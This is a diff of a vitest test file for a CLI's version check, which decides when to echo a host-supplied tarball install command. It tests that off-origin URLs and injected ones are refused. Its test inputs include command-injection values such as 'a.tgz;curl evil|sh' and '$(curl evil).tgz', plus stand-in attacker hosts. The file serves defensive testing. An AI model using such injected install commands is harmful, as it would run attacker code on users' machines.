@@ -1,5 +1,17 @@
 import { describe, expect, it } from "vitest";
-import { cliPackage, cliVersion, commandFor, compareSemver, hostCliVerdict, isNpmPackageName, isTarballUrl, selfCommand, tarballCommand } from "../src/version.js";
+import {
+  cliPackage,
+  cliVersion,
+  commandFor,
+  compareSemver,
+  hostCliVerdict,
+  isNpmPackageName,
+  isTarballUrl,
+  sameHostTarballUrl,
+  selfCommand,
+  selfTarballUrl,
+  tarballCommand,
+} from "../src/version.js";
 import { runCli } from "../src/cli.js";
 
 describe("version", () => {
@@ -39,6 +51,7 @@ describe("version", () => {
 
   it("Final fix wave (C1): cliPackage() is undefined under tsx -- only the bundle defines it", () => {
     expect(cliPackage()).toBeUndefined();
+    expect(selfTarballUrl()).toBeUndefined();
   });
 
   describe("remote agents: a CLI a host serves as a tarball", () => {
@@ -79,22 +92,58 @@ describe("version", () => {
       });
     });
 
-    it("below the host's version, the refusal names the host's tarball command, never the unpublished npm package", () => {
-      const v = hostCliVerdict(
-        { package: "@arena/cli", version: "0.2.0" },
-        { ownPackage: "@arena/cli", current: "0.1.0", server: "http://100.70.62.92:8700", tarball: { url: URL } },
-      );
-      expect(v).toEqual({
-        refusal: `this host requires arena CLI version 0.2.0 or newer (you are running 0.1.0): install and run it with: npx -y --prefer-offline --package=${URL} arena init --server http://100.70.62.92:8700`,
+    // Fix round 1 (C-1): a host's cliTarball URL is code the host chose. Only a build a host served as its own tarball
+    // (a baked URL) looks at it, and repeats it only on that same origin, at a /cli/<name>.tgz path.
+    const NEED = "this host requires arena CLI version 0.2.0 or newer (you are running 0.1.0)";
+    const tarballBuild = (url: unknown) => ({ ownPackage: "@arena/cli", current: "0.1.0", server: "http://100.70.62.92:8700", selfTarballUrl: URL, tarball: { url } });
+
+    it("C-1: a tarball build repeats the host's newer tarball only on its own origin, at a /cli/<name>.tgz path", () => {
+      const newer = URL.replace("0.1.0-", "0.2.0-");
+      expect(hostCliVerdict({ package: "@arena/cli", version: "0.2.0" }, tarballBuild(newer))).toEqual({
+        refusal: `${NEED}: install and run it with: npx -y --prefer-offline --package=${newer} arena init --server http://100.70.62.92:8700`,
       });
-      expect(JSON.stringify(v)).not.toContain("@arena/cli@");
     });
 
-    it("a tarball URL that is not plain is never echoed: the refusal points at skill.md's step 0 instead", () => {
-      for (const url of ["http://h/cli/a.tgz;curl evil|sh", "http://h/$(curl evil).tgz", 42, undefined]) {
-        const v = hostCliVerdict({ package: "@arena/cli", version: "0.2.0" }, { ownPackage: "@arena/cli", current: "0.1.0", server: "http://h", tarball: { url } });
-        expect(v, String(url)).toEqual({ refusal: "this host requires arena CLI version 0.2.0 or newer (you are running 0.1.0): install it as step 0 of this host's skill.md says" });
+    it("C-1: a tarball build never repeats a URL on another origin or path -- and never the placeholder npm form", () => {
+      for (const url of [
+        "http://evil.example/x.tgz",
+        "https://attacker.example/cli/arena-cli-9.9.9.tgz",
+        "http://100.70.62.93:8700/cli/arena-cli-0.2.0-ab.tgz", // another tailnet node
+        "http://100.70.62.92:8701/cli/arena-cli-0.2.0-ab.tgz", // another port: another origin
+        "https://100.70.62.92:8700/cli/arena-cli-0.2.0-ab.tgz", // another scheme: another origin
+        "http://100.70.62.92:8700/x.tgz", // the right origin, not a /cli/ path
+        "http://100.70.62.92:8700/cli/sub/x.tgz",
+        "http://100.70.62.92:8700/cli/a.tgz;curl evil|sh",
+        42,
+        undefined,
+      ]) {
+        const v = hostCliVerdict({ package: "@arena/cli", version: "0.2.0" }, tarballBuild(url));
+        expect(v, String(url)).toEqual({ refusal: `${NEED}: install it as step 0 of this host's skill.md says` });
       }
+      // A host with no cliTarball at all: still no command, and never `npx -y @arena/cli@`, a name that is not ours.
+      const none = hostCliVerdict({ package: "@arena/cli", version: "9.9.9" }, { ownPackage: "@arena/cli", current: "0.1.0", server: "http://h", selfTarballUrl: URL });
+      expect(none).toEqual({ refusal: "this host requires arena CLI version 9.9.9 or newer (you are running 0.1.0): install it as step 0 of this host's skill.md says" });
+      expect(JSON.stringify(none)).not.toContain("@arena/cli@");
+    });
+
+    it("C-1: an npm (release) build and tsx ignore cliTarball entirely: the refusal is the npm one, unchanged from master", () => {
+      const evil = { url: "http://evil.example/x.tgz", sha256: "a".repeat(64) };
+      const release = hostCliVerdict({ package: "arc-chess", version: "9.9.9" }, { ownPackage: "arc-chess", current: "0.1.0", server: "https://evil.example", tarball: evil });
+      expect(release).toEqual({
+        refusal: "this host requires arena CLI version 9.9.9 or newer (you are running 0.1.0): install and run it with: npx -y arc-chess@9.9.9 init --server https://evil.example",
+      });
+      expect(release).toEqual(hostCliVerdict({ package: "arc-chess", version: "9.9.9" }, { ownPackage: "arc-chess", current: "0.1.0", server: "https://evil.example" }));
+      const tsx = hostCliVerdict({ package: "@x/arena", version: "9.9.9" }, { ownPackage: undefined, current: "0.1.0", server: "https://evil.example", tarball: evil });
+      expect(tsx).toEqual({
+        refusal: "this host requires arena CLI version 9.9.9 or newer (you are running 0.1.0): install and run it with: npx -y @x/arena@9.9.9 init --server https://evil.example",
+      });
+      for (const v of [release, tsx]) expect(JSON.stringify(v)).not.toContain("evil.example/x.tgz");
+    });
+
+    it("C-1: sameHostTarballUrl is the whole rule", () => {
+      expect(sameHostTarballUrl(URL.replace("0.1.0-", "0.2.0-"), URL)).toBe(URL.replace("0.1.0-", "0.2.0-"));
+      expect(sameHostTarballUrl(URL, undefined)).toBeUndefined();
+      expect(sameHostTarballUrl("http://evil.example/cli/x.tgz", URL)).toBeUndefined();
     });
   });
 
